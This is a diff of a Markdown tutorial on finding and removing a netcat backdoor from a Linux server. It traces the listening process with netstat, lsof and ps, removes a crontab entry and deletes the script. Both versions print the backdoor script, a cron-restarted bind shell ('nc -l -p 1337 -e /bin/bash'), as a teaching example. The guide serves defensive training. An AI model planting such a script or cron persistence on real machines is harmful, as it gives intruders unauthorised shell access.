@@ -74,56 +74,55 @@ In order to find and remove these backdoors from the inside:
 1. Figure out which process is listening on the backdoor port: 
     * `netstat -tulpn | grep 1337`
     * `tcp    0    0 0.0.0.0:1337    0.0.0.0:*    LISTEN    3652/nc`
-    * in this case 3652 is the process id.
-2. Figure out which files are being used by the process.
-    * `lsof -p 3652` (change the number to match the process id)
-    
-    ```
-    COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
-    nc      3652 rose  cwd    DIR    8,1     4096 2097264 /home/rose
-    nc      3652 rose  rtd    DIR    8,1     4096       2 /
-    nc      3652 rose  txt    REG    8,1    27160  655411 /bin/nc.traditional
-    nc      3652 rose  DEL    REG    8,1          1576273 /lib/x86_64-linux-gnu/libnss_files-2.13.so
-    nc      3652 rose  DEL    REG    8,1          1576266 /lib/x86_64-linux-gnu/libc-2.13.so
-    nc      3652 rose  DEL    REG    8,1          1576264 /lib/x86_64-linux-gnu/ld-2.13.so
-    nc      3652 rose    0u  sock    0,7      0t0    7534 can't identify protocol
-    nc      3652 rose    1u   REG    8,1        0 2490381 /tmp/tmpfhdUXJp (deleted)
-    nc      3652 rose    2u   REG    8,1        0 2490381 /tmp/tmpfhdUXJp (deleted)
-    nc      3652 rose    3u  IPv4   7535      0t0     TCP *:1337 (LISTEN)
-
-    ```
-    
-    * Things to note:
-        * the user for all these commands is rose -- so rose is the one running the backdoor.
-        * some of the files used by the process are the program that it is running. In this case, `/bin/nc` is the actual program. But nc is a basic program. We need to figure out HOW rose is running the program.
-        * Don't just kill the process. You could eliminate the trail to the process. But in this case, it's actually easy -- the process will restart in a minute if we kill it.
-        * Why??? something is restarting the process! Probably a scheduled task. In linux, cron is the way to create scheduled tasks.
-        * Edit rose's crontab:
-            * `crontab -u rose -e`
-            * This line: `* * * * * /usr/sbin/backdoor` tells the scheduler to run the program `/usr/sbin/backdoor` every minute.
-            * remove that line from the crontab.
-            * make sure it's been removed: `crontab -u rose -l`
-        * for fun: explanation of the backdoor:
-        
-            ```bash
-            ## It is a script:
-            #!/bin/bash
-            
-            ## This is the command it uses to check that the script is running:
-            isOn=`netstat -tln | grep ':1337'|wc -l`
-            
-            ## The if statement checks the result of the isOn command -- if it is zero, then
-            if [ $isOn == "0" ]
-            then
-              ## It starts a netcat command that enables data sent to the 1337 port to give access to bash (the command line)
-              nc -l -p 1337 -e /bin/bash
-            fi
+    * in this case 3652 is the process id. Now that we have the process ID, we can find out where it came from.
+2. Figure out how the process is being run:
+    * Now that we have a process ID, we could simply kill the process. However, there are two reasons we should do more investigating first:
+        1. Killing the process would make it harder to track it down. The running process provides clues to its location. With that said, you may want to somehow block access to that machine while you investigate, if you are running live.
+        2. If you were to kill this particular process, you would be surprised to discover the backdoor running again less than a minute after you killed it.
+    * We can trace a process using the process tree:
+        * `ps -eFH` lists processes running on the system in a tree form -- showing which processes own which other processes.
+        * `ps -eFH | grep -B5 <the process id of nc>` will show us the line of the `nc` process that is actually listening on the port, as well as 5 lines before it, enabling us to see the tree leading to that process.
+        * The output from this command tells us that netcat is being run by the script `/usr/sbin/backdoor`, which was ultimately run by `/USR/SBIN/CRON`
             ```
-        * Now remove the backdoor file:
-            * `rm /usr/sbin/backdoor`
+            root     16142  2520  0 14614  1556   0 20:44 ?        00:00:00     /USR/SBIN/CRON
+            rose     16143 16142  0  1047   588   0 20:44 ?        00:00:00       /bin/sh -c /usr/sbin/backdoor
+            rose     16144 16143  0  2690  1388   0 20:44 ?        00:00:00         /bin/bash /usr/sbin/backdoor
+            rose     16149 16144  0  1549   724   0 20:44 ?        00:00:00           nc -l -p 1337 -e /bin/bash
+            ```
+        * Since cron is the task scheduling system on linux, we know that it is a scheduled task that is triggering the backdoor. We also know where the backdoor is located. And, since the owner of the backdoor processes is `rose`, we can guess that it is rose's crontab that is scheduling the backdoor (If you want to learn more about cron or scripting, look at the resources section).
+    * So let's remove that line from rose's crontab:
+        * `crontab -u rose -e`
+        * This line: `* * * * * /usr/sbin/backdoor` tells the scheduler to run the program `/usr/sbin/backdoor` every minute.
+        * remove that line from the crontab.
+        * make sure it's been removed: `crontab -u rose -l`
+    * Now we can kill the process and it will stay dead.
+        * `kill -s SIGKILL <the process id goes here>`
+    * Now remove the backdoor file:
+        * `rm /usr/sbin/backdoor`
 3. Verify that it's gone:
     * no more listening `netstat -tulpn | grep 1337` ( should give no output )
     * files are gone `cat /usr/sbin/backdoor` (should say "no file or directory")
+
+As a fun aside, here's an explanation of the backdoor:
+    
+```bash
+## It is a script:
+#!/bin/bash
+
+## This is the command it uses to check that the script is running:
+isOn=`netstat -tln | grep ':1337'| wc -l`
+
+## The if statement checks the result of the isOn command -- if it is zero, then
+if [ $isOn == "0" ]
+then
+  ## It starts a netcat command that enables data sent to the 1337 port to give access to bash (the command line)
+  nc -l -p 1337 -e /bin/bash
+fi
+```
+
+Another note: with this backdoor, we could simply remove the offending file from /usr/sbin and killed the process. Then the scheduled task would simply stop working because it wouldn't have a program to execute. However, other backdoors could be more complicated (for example, if another scheduled task regenerated the backdoor in the location where you deleted it). So backdoors have to be treated with a lot of investigation and care. 
+
+In a corporate environment, you would possibly have a good chat with Rose. You may even give her a kind invitation to no longer work in your organization. Or perhaps, invite some helpful Law Enforcement Officers to have a conversation with her. ;)
 
 Once we've cleaned up the operating system, we can move on to the server itself.
 
@@ -416,6 +415,7 @@ Learn the basics from the [learning the shell tutorial](http://linuxcommand.org/
 
 If you already know how to use the command line, you should learn scripting. Scripting unleashes the true power of linux and its command line. You can learn more about that from [a different tutorial on the site](http://linuxcommand.org/lc3_writing_shell_scripts.php).
 
+You can make your scripts even more useful with scheduling. Here's [an article on cron](http://www.unixgeeks.org/security/newbie/unix/cron-1.html)
 
 For the adventurous: I love using vim. If you are bored and want a really cool challenge, learn vim. Try [this vim tutorial to get started](http://www.openvim.com/).
 
